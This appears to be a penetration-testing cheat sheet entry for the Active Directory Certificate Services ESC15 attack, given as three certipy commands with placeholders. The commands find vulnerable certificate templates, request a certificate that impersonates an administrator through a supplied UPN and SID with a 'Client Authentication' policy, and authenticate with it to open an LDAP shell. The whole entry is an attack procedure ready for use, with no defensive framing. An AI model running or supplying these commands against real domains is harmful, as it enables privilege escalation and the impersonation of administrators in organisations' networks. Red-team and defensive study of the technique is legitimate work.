# ADCS ESC15

% adcs, certificate, ActiveDirectory, template

## 1. Finding vulnerable template
```
certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
```

## 2. Request certificate
```
certipy req -u '<username>' -p '<password>' -dc-ip '<DC_IP>' -target '<CA_FQDN>' -ca '<CA_HOST>' -template '<TEMPLATE>' -upn '<ADMIN_USER>@<domain>' -sid '<ADMIN_SID>' -application-policies 'Client Authentication'
```

## 3. Authenticate
```
certipy auth -pfx '<ADMIN_USER>.pfx' -dc-ip '<dc-ip>' -ldap-shell
```
